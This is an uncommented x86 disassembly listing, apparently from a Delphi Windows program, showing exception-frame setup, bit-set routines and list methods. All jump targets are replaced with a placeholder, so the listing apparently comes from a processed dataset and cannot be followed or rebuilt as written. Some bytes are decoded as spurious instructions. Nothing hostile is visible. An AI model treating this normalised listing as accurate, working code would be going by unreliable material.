and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_41924c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_419228
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_40276c
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402bf8
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_40278c
mov edx edi
mov eax ebp
call sub_419240
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_402968
sub_4192f0
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_419228
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_41924c
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_419334
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_4193ac
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax esi
call sub_41c430
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_4193ec
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4194a2
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404014
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_40313c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041e0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_40313c
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc04
call sub_4039b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4194a9
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_4194c8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_41955d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_40313c
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_4041e0
mov eax ebx
mov si 0xffff
call sub_4033e8
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419564
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov eax ebx
mov si 0xffff
call sub_4033e8
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_4033e8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_4042fc
sub_41956f
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403440
mov eax ebx
mov si 0xffff
call sub_4033e8
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_4033e8
push eax
lea eax [ ebx + 0x4 ]
call sub_4058a0
mov ecx eax
mov edx r-xdata
pop eax
call sub_4032a0
sub_4195cc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_4195ec
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_41960c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032a0
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_419634
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax edi
call sub_4058a0
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
mov si 0xffff
call sub_4033e8
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax edi
call sub_4058a0
mov edx eax
mov eax esi
call sub_419634
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax edi
call sub_4058a0
push eax
push r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
sub_4196cc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_419721
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4058a0
mov edx eax
mov eax edi
call sub_419634
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419728
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_419730
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_419768
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4193ac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_419798
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_4197d4
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_40313c
mov edx esp
mov eax esi
call sub_4041e0
add esp 0x100
pop esi
pop ebx
retn
sub_4197fc
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_419891
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_40313c
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_4041e0
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_4033e8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_4197bc
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_409070
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419898
lea eax [ ebp - 0x14 ]
call sub_403f7c
retn
sub_4198b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_419da0
mov edx ebx
mov eax esi
call sub_419d38
sub_4198e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4197bc
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_418eb8
mov dl 0x1
mov eax ebx
call sub_419798
sub_419914
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ esi + 0x8 ] eax
xor ecx ecx
mov edx esi
mov eax esi
call sub_4196cc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_419960
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov [ esi + 0xc ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov cl 0x1
mov edx esi
mov eax esi
call sub_4196cc
mov eax [ esi + 0x8 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4193ac
test bl bl
jle r-xdata
mov eax esi
call sub_419a78
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_4199ac
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4199cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4193d8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_419a4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419a78
mov eax esi
call sub_419b1c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc ebx
xor edi edi
mov edx edi
mov eax esi
call sub_419b24
push eax
mov eax [ ebp - 0x4 ]
call sub_4199ac
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
dec ebx
jne r-xdata
sub_419a78
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_419ad2
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_418eac
call sub_4031ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_419afc
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419b24
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_419b38
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_419be6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_40313c
lea edx [ ebp - 0x108 ]
mov eax edi
call sub_4041e0
mov eax ebx
mov si 0xffff
call sub_4033e8
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419bed
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
mov eax ebx
mov si 0xffff
call sub_4033e8
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_4033e8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_419c00
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_4042fc
sub_419c00
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
call sub_403fd0
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_4033e8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40342c
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40342c
call sub_414d70
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebx + 0x8 ]
shl eax 0x2
call sub_40276c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_419cfd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40342c
mov edx [ ebp - 0xc ]
call sub_414f74
movsx edi [ ebx + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40278c
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp - 0x10 ]
call sub_414ff8
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov esi [ eax + ebx * 4 ]
mov eax [ esi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
lea edx [ esi + 0x1a ]
call sub_4041e0
sub_419d1c
push ebx
push esi
mov esi edx
call sub_4199ac
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax ebx
pop esi
pop ebx
retn
sub_419d38
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_403378
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418c68
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_419a68
xor ecx ecx
mov edx esi
mov eax ebx
call sub_4196cc
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_418d50
sub_419da0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_418eac
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418f60
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_418cb4
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_4196cc
mov eax ebx
call sub_419a68
pop edi
pop esi
pop ebx
retn
sub_419dfc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418dc4
mov edx eax
mov cl 0x2
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418dc4
call sub_4031ec
pop edi
pop esi
pop ebx
retn
sub_419e40
push ecx
mov [ esp ] edx
sub cl 0x1
jb r-xdata
mov edx esp
mov ecx [ eax ]
call [ ecx + 0xc ]
pop edx
retn
dec cl
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edx
retn
sub_419e64
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_419914
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_419eac
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41aa90
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4193ac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_419edc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_419f00
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_419f24
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419fcb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41a074
xor eax eax
push ebp
push sub_419fae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419fb5
mov eax [ ebp - 0x4 ]
call sub_41a130
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_419fdc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4193d8
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41a074
xor eax eax
push ebp
push sub_41a05c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a130
retn
sub_41a08c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41a144
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_41a0e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_41a928
mov eax [ ebp - 0x8 ]
push eax
push sub_41ac84
push ebp
call sub_41a08c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a144
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a1d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a1e0
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403fa0
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_404388
jne r-xdata
sub_41a1f0
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_41a1ec
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
jmp sub_4039b8
sub_41a228
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a270
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405d64
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_41a1f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a277
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_41a280
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a358
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41a074
xor eax eax
push ebp
push sub_41a336
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a33d
mov eax [ ebp - 0x4 ]
call sub_41a130
retn
sub_41a374
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41a3b9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40443c
call sub_408bb4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a3c0
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_41a3c8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a4d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_404014
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_40406c
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a4da
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403fa0
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
